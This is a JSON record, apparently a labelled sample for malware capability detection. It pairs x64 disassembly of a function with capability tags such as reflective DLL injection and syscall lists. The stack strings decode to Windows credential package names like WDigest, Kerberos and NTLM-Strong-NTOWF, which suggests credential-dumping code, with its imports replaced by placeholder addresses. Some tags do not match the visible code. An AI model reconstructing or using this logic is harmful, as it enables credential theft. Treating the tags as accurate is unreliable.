{
  "address": "0x1400a5ebc",
  "rules": [
    "encrypt data using RC4 KSA/ce2c5ff22cc84a5d8021901651b76a23",
    "inject DLL reflectively/b607069806754d328a539a309fa49b81",
    "populate SysWhispers2 syscall list/bac71c42a489454d9c62b98a7189c5d2",
    "load assembly via IAssembly/08d07504566140e580f88ed84a643e72",
    "connect to WMI namespace via WbemLocator/50f8c95bd151440fa4fe29260efaf440",
    "validate payment card number using luhn algorithm with no lookup table/f595b07566ee46b3ba7870816078c34e",
    "PEB access/2627ea084e2f4bea91f14e6cd276939a",
    "contain loop"
  ],
  "disassembly": [
    "mov     qword [rsp+0x8], rcx",
    "push    rdi",
    "sub     rsp, 0x250",
    "mov     dword [rsp+0x238], 0x0",
    "mov     qword [rsp+0x230], 0x0",
    "mov     dword [rsp+0x30], 0x4c0043",
    "mov     dword [rsp+0x34], 0x410045",
    "mov     dword [rsp+0x38], 0x540052",
    "mov     dword [rsp+0x3c], 0x580045",
    "mov     dword [rsp+0x40], 0x54",
    "lea     rdi, [rsp+0x44]",
    "xor     eax, eax",
    "mov     ecx, 0x14",
    "rep stosb byte [rdi]",
    "mov     dword [rsp+0x58], 0x440057",
    "mov     dword [rsp+0x5c], 0x670069",
    "mov     dword [rsp+0x60], 0x730065",
    "mov     dword [rsp+0x64], 0x74",
    "lea     rdi, [rsp+0x68]",
    "xor     eax, eax",
    "mov     ecx, 0x18",
    "rep stosb byte [rdi]",
    "mov     dword [rsp+0x80], 0x65004b",
    "mov     dword [rsp+0x84], 0x620072",
    "mov     dword [rsp+0x88], 0x720065",
    "mov     dword [rsp+0x8c], 0x73006f",
    "mov     dword [rsp+0x90], 0x0",
    "lea     rdi, [rsp+0x94]",
    "xor     eax, eax",
    "mov     ecx, 0x14",
    "rep stosb byte [rdi]",
    "mov     dword [rsp+0xa8], 0x65004b",
    "mov     dword [rsp+0xac], 0x620072",
    "mov     dword [rsp+0xb0], 0x720065",
    "mov     dword [rsp+0xb4], 0x73006f",
    "mov     dword [rsp+0xb8], 0x4e002d",
    "mov     dword [rsp+0xbc], 0x770065",
    "mov     dword [rsp+0xc0], 0x720065",
    "mov     dword [rsp+0xc4], 0x4b002d",
    "mov     dword [rsp+0xc8], 0x790065",
    "mov     dword [rsp+0xcc], 0x73",
    "mov     dword [rsp+0xd0], 0x54004e",
    "mov     dword [rsp+0xd4], 0x4d004c",
    "mov     dword [rsp+0xd8], 0x53002d",
    "mov     dword [rsp+0xdc], 0x720074",
    "mov     dword [rsp+0xe0], 0x6e006f",
    "mov     dword [rsp+0xe4], 0x2d0067",
    "mov     dword [rsp+0xe8], 0x54004e",
    "mov     dword [rsp+0xec], 0x57004f",
    "mov     dword [rsp+0xf0], 0x46",
    "lea     rdi, [rsp+0xf4]",
    "xor     eax, eax",
    "mov     ecx, 0x4",
    "rep stosb byte [rdi]",
    "mov     eax, 0x12",
    "mov     word [rsp+0x1e0], ax",
    "mov     eax, 0x12",
    "mov     word [rsp+0x1e2], ax",
    "lea     rax, [rsp+0x30]",
    "mov     qword [rsp+0x1e8], rax",
    "mov     eax, 0xe",
    "mov     word [rsp+0x1f0], ax",
    "mov     eax, 0xe",
    "mov     word [rsp+0x1f2], ax",
    "lea     rax, [rsp+0x58]",
    "mov     qword [rsp+0x1f8], rax",
    "mov     eax, 0x10",
    "mov     word [rsp+0x200], ax",
    "mov     eax, 0x10",
    "mov     word [rsp+0x202], ax",
    "lea     rax, [rsp+0x80]",
    "mov     qword [rsp+0x208], rax",
    "mov     eax, 0x26",
    "mov     word [rsp+0x210], ax",
    "mov     eax, 0x26",
    "mov     word [rsp+0x212], ax",
    "lea     rax, [rsp+0xa8]",
    "mov     qword [rsp+0x218], rax",
    "mov     eax, 0x22",
    "mov     word [rsp+0x220], ax",
    "mov     eax, 0x22",
    "mov     word [rsp+0x222], ax",
    "lea     rax, [rsp+0xd0]",
    "mov     qword [rsp+0x228], rax",
    "mov     r9b, 0x1",
    "mov     r8d, 0x10000000",
    "lea     rdx, [rsp+0x1c8]",
    "xor     ecx, ecx",
    "mov     rax, 0x4141414141414141",
    "\u26a0\ufe0fcall    rax",
    "test    eax, eax",
    "jl      0x1400a679f",
    "xor     eax, eax",
    "add     rsp, 0x250",
    "pop     rdi",
    "retn    ",
    "mov     r8, qword [rsp+0x260]",
    "add     r8, 0x30",
    "lea     r9, [rsp+0x1c0]",
    "mov     edx, 0x10000000",
    "mov     rcx, qword [rsp+0x1c8]",
    "mov     rax, 0x4444444444444444",
    "\u26a0\ufe0fcall    rax",
    "test    eax, eax",
    "jl      0x1400a678b",
    "lea     rcx, [rsp+0x1c8]",
    "mov     rax, 0x4242424242424242",
    "\u26a0\ufe0fcall    rax",
    "lea     r9, [rsp+0x1d0]",
    "mov     rax, qword [rsp+0x260]",
    "mov     r8d, dword [rax+0x28]",
    "mov     edx, 0x10000000",
    "mov     rcx, qword [rsp+0x1c0]",
    "mov     rax, 0x4545454545454545",
    "\u26a0\ufe0fcall    rax",
    "test    eax, eax",
    "jl      0x1400a6777",
    "lea     rcx, [rsp+0x1c0]",
    "mov     rax, 0x4242424242424242",
    "\u26a0\ufe0fcall    rax",
    "mov     dword [rsp+0x20], 0x0",
    "jmp     0x1400a61e0",
    "cmp     dword [rsp+0x20], 0x6",
    "jae     0x1400a65a8",
    "mov     ecx, dword [rsp+0x238]",
    "add     rcx, 0x68",
    "mov     rax, qword [rsp+0x260]",
    "mov     dword [rax+0x10], ecx",
    "mov     rax, qword [rsp+0x260]",
    "mov     edx, dword [rax+0x10]",
    "mov     r9d, 0x4",
    "mov     r8d, 0x3000",
    "xor     ecx, ecx",
    "mov     rax, 0x4a4a4a4a4a4a4a4a",
    "\u26a0\ufe0fcall    rax",
    "mov     rdx, rax",
    "mov     rax, qword [rsp+0x260]",
    "mov     qword [rax+0x18], rdx",
    "mov     rax, qword [rsp+0x260]",
    "cmp     qword [rax+0x18], 0x0",
    "je      0x1400a6763",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "mov     qword [rsp+rax+0x118], 0x0",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "mov     dword [rsp+rax+0x104], 0x0",
    "mov     ecx, dword [rsp+0x20]",
    "imul    rcx, rcx, 0x20",
    "mov     eax, dword [rsp+0x20]",
    "mov     dword [rsp+rcx+0x100], eax",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "mov     dword [rsp+rax+0x110], 0x80",
    "cmp     dword [rsp+0x20], 0x0",
    "je      0x1400a629e",
    "lea     rcx, [rsp+0x1d0]",
    "mov     rax, 0x4242424242424242",
    "\u26a0\ufe0fcall    rax",
    "mov     dword [rsp+0x238], 0x0",
    "mov     rax, qword [rsp+0x260]",
    "mov     rax, qword [rax+0x18]",
    "mov     dword [rax], 0x6",
    "mov     dword [rsp+0x20], 0x0",
    "jmp     0x1400a6637",
    "lea     r8, [rsp+0x230]",
    "mov     edx, 0x15",
    "mov     rcx, qword [rsp+0x1d0]",
    "mov     rax, 0x4646464646464646",
    "\u26a0\ufe0fcall    rax",
    "mov     edx, eax",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "mov     dword [rsp+rax+0x110], edx",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "cmp     dword [rsp+rax+0x110], 0x0",
    "jl      0x1400a654d",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "lea     r9, [rsp+rax+0x104]",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "lea     r8, [rsp+rax+0x118]",
    "mov     eax, dword [rsp+0x20]",
    "sub     eax, 0x1",
    "mov     eax, eax",
    "imul    rax, rax, 0x10",
    "lea     rdx, [rsp+rax+0x1e0]",
    "mov     rcx, qword [rsp+0x1d0]",
    "mov     rax, 0x4343434343434343",
    "\u26a0\ufe0fcall    rax",
    "mov     edx, eax",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "mov     dword [rsp+rax+0x110], edx",
    "jmp     0x1400a654d",
    "cmp     dword [rsp+0x20], 0x6",
    "jae     0x1400a6763",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "cmp     dword [rsp+rax+0x110], 0x0",
    "jl      0x1400a65a3",
    "mov     rax, qword [rsp+0x230]",
    "movzx   eax, byte [rax+0x13b]",
    "test    eax, eax",
    "je      0x1400a6311",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "cmp     dword [rsp+rax+0x110], 0x0",
    "jl      0x1400a675e",
    "jmp     0x1400a61d5",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "cmp     qword [rsp+rax+0x118], 0x0",
    "je      0x1400a65a3",
    "mov     dword [rsp+0x23c], 0x0",
    "mov     rax, qword [rsp+0x230]",
    "movzx   eax, word [rax+0xf0]",
    "mov     dword [rsp+0x23c], eax",
    "jmp     0x1400a631c",
    "jmp     0x1400a662c",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "cmp     qword [rsp+rax+0x118], 0x0",
    "je      0x1400a6742",
    "mov     eax, dword [rsp+0x20]",
    "add     eax, 0x1",
    "mov     dword [rsp+0x20], eax",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "cmp     dword [rsp+rax+0x104], 0x0",
    "je      0x1400a65a3",
    "mov     edx, 0x15",
    "mov     rcx, qword [rsp+0x230]",
    "mov     rax, 0x4747474747474747",
    "\u26a0\ufe0fcall    rax",
    "mov     rax, qword [rsp+0x230]",
    "movzx   eax, byte [rax+0x138]",
    "test    eax, eax",
    "je      0x1400a6401",
    "mov     ecx, dword [rsp+0x23c]",
    "add     ecx, 0x28",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "mov     dword [rsp+rax+0x104], ecx",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "mov     edx, dword [rsp+rax+0x104]",
    "mov     ecx, 0x40",
    "mov     rax, 0x4d4d4d4d4d4d4d4d",
    "\u26a0\ufe0fcall    rax",
    "mov     rdx, rax",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "mov     qword [rsp+rax+0x118], rdx",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "cmp     qword [rsp+rax+0x118], 0x0",
    "je      0x1400a6534",
    "mov     eax, dword [rsp+0x20]",
    "add     eax, 0x1",
    "mov     dword [rsp+0x20], eax",
    "mov     ecx, dword [rsp+0x20]",
    "imul    rcx, rcx, 0x20",
    "mov     rcx, qword [rsp+rcx+0x118]",
    "mov     rax, 0x4b4b4b4b4b4b4b4b",
    "\u26a0\ufe0fcall    rax",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "cmp     dword [rsp+rax+0x104], 0x0",
    "je      0x1400a6742",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "mov     ecx, dword [rsp+rax+0x104]",
    "mov     eax, dword [rsp+0x238]",
    "add     eax, ecx",
    "mov     dword [rsp+0x238], eax",
    "mov     rax, qword [rsp+0x230]",
    "movzx   eax, byte [rax+0x139]",
    "test    eax, eax",
    "je      0x1400a647f",
    "mov     rax, qword [rsp+0x230]",
    "movzx   eax, word [rax+0xd0]",
    "cmp     eax, 0x10",
    "jne     0x1400a6401",
    "mov     ecx, dword [rsp+0x238]",
    "add     rcx, 0x68",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "mov     dword [rsp+rax+0x108], ecx",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "movdqu  xmm0, xmmword [rsp+rax+0x100]",
    "movdqu  xmmword [rsp+0x240], xmm0",
    "mov     rcx, qword [rsp+0x260]",
    "mov     rcx, qword [rcx+0x18]",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x10",
    "movdqu  xmm0, xmmword [rsp+0x240]",
    "movdqu  xmmword [rcx+rax+0x8], xmm0",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "mov     r8d, dword [rsp+rax+0x104]",
    "mov     edx, dword [rsp+0x20]",
    "imul    rdx, rdx, 0x20",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "mov     ecx, dword [rsp+rax+0x108]",
    "mov     rax, qword [rsp+0x260]",
    "add     rcx, qword [rax+0x18]",
    "mov     rdx, qword [rsp+rdx+0x118]",
    "mov     rax, 0x4c4c4c4c4c4c4c4c",
    "\u26a0\ufe0fcall    rax",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "mov     ecx, dword [rsp+rax+0x104]",
    "mov     eax, dword [rsp+0x238]",
    "add     eax, ecx",
    "mov     dword [rsp+0x238], eax",
    "mov     rax, qword [rsp+0x230]",
    "movzx   eax, byte [rax+0x13b]",
    "test    eax, eax",
    "je      0x1400a6534",
    "mov     rax, qword [rsp+0x230]",
    "movzx   eax, word [rax+0xe0]",
    "cmp     eax, 0x10",
    "jne     0x1400a647f",
    "mov     rax, qword [rsp+0x230]",
    "cmp     qword [rax+0xd8], 0x0",
    "je      0x1400a6401",
    "mov     rax, qword [rsp+0x230]",
    "movzx   eax, word [rax+0xf0]",
    "test    eax, eax",
    "je      0x1400a6534",
    "mov     rax, qword [rsp+0x230]",
    "cmp     qword [rax+0xe8], 0x0",
    "je      0x1400a647f",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "mov     rax, qword [rsp+rax+0x118]",
    "mov     byte [rax+0x21], 0x1",
    "mov     ecx, dword [rsp+0x20]",
    "imul    rcx, rcx, 0x20",
    "mov     rcx, qword [rsp+rcx+0x118]",
    "add     rcx, 0x10",
    "mov     r8d, 0x10",
    "mov     rdx, qword [rsp+0x230]",
    "mov     rdx, qword [rdx+0xd8]",
    "mov     rax, 0x4c4c4c4c4c4c4c4c",
    "\u26a0\ufe0fcall    rax",
    "mov     rax, qword [rsp+0x230]",
    "cmp     qword [rax+0xf8], 0x0",
    "je      0x1400a6534",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "mov     rax, qword [rsp+rax+0x118]",
    "mov     byte [rax+0x20], 0x1",
    "mov     ecx, dword [rsp+0x20]",
    "imul    rcx, rcx, 0x20",
    "mov     r8d, 0x10",
    "mov     rdx, qword [rsp+0x230]",
    "mov     rdx, qword [rdx+0xe8]",
    "mov     rcx, qword [rsp+rcx+0x118]",
    "mov     rax, 0x4c4c4c4c4c4c4c4c",
    "\u26a0\ufe0fcall    rax",
    "mov     eax, dword [rsp+0x20]",
    "imul    rax, rax, 0x20",
    "mov     rax, qword [rsp+rax+0x118]",
    "mov     byte [rax+0x23], 0x1",
    "mov     ecx, dword [rsp+0x20]",
    "imul    rcx, rcx, 0x20",
    "mov     rcx, qword [rsp+rcx+0x118]",
    "mov     rax, qword [rsp+0x230]",
    "movzx   eax, word [rax+0xf0]",
    "mov     dword [rcx+0x24], eax",
    "mov     rax, qword [rsp+0x230]",
    "movzx   r8d, word [rax+0xf0]",
    "mov     ecx, dword [rsp+0x20]",
    "imul    rcx, rcx, 0x20",
    "mov     rcx, qword [rsp+rcx+0x118]",
    "add     rcx, 0x28",
    "mov     rdx, qword [rsp+0x230]",
    "mov     rdx, qword [rdx+0xf8]",
    "mov     rax, 0x4c4c4c4c4c4c4c4c",
    "\u26a0\ufe0fcall    rax"
  ],
  "high_level_IL": [
    "No High Level IL Loaded"
  ]
}